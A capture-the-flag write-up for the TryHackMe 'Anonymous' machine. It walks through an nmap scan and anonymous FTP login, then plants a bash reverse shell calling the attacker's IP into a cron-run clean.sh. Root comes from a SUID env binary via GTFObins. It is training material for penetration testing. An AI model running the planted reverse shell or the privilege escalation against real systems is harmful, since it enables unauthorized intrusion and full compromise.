---
date: 2020-05-24 15:48:48
layout: post
title: "Anonymous"
subtitle:
description: Medium rated machine from Tryhackme
image: /writeup/assets/img/anonymous/anonymous.png
optimized_image:
category: Tryhackme
tags: tryhackme ftp
author: cirius
paginate: false
---
<a href="https://tryhackme.com/room/anonymous">Link</a> to the the Machine on tryhackme. 
Starting with the nmap scan
```bash
nmap -T4 -p- -A 10.10.73.153
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 20:18 IST
Nmap scan report for 10.10.135.212
Host is up (0.23s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 2s, median: 0s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-05-24T14:49:01+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-24T14:49:00
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   375.13 ms 10.9.0.1
2   373.50 ms 10.10.73.153

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.89 seconds
```

Found 4 open ports.
My first approach was to check for anonymous login on ftp and yes the anonymous login was allowed.

Inside the ftp server, a directory named scripts was present. The directory contained 3 files named **clean.sh , removed_files.log , to_do.txt.
I downloaded all files. The to_do.txt listed
```text
I really need to disable the anonymous login...it's really not safe
```
The clean.sh contents
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

and the removed_files.log conatained,
```text
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

So the clean.sh was running at some interval of time and then writing the removed_files.log

I added my command to get a reverse shell, next time the script executes.
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
        bash -i >& /dev/tcp/10.9.12.192/8888 0>&1 
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
Made the permission of the local clean.sh same as on the ftp server
```bash
chmod 757 clean.sh
```
Uploaded it to the ftp server and then started listening for the connection.

After a while, got the reverse shell.
![placeholder](/writeup/assets/img/anonymous/shell.png "shell")
Made shell better by these commands.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
#Then
export TERM=xterm
#Then press ctrl+z
#type
stty raw -echo
#then
fg
#then press Enter two times.
#This makes shell with most functions as ssh shell.
```

Got the user flag

Looking for any interesting SUID binary,
```bash
find / -perm -u=s -type f 2>/dev/null
```
I found **env** binary as SUID.

Executed this command as given by GTFObins
```bash
env /bin/sh -p 
```
This gave me the root shell.
 
 Got the root flag.
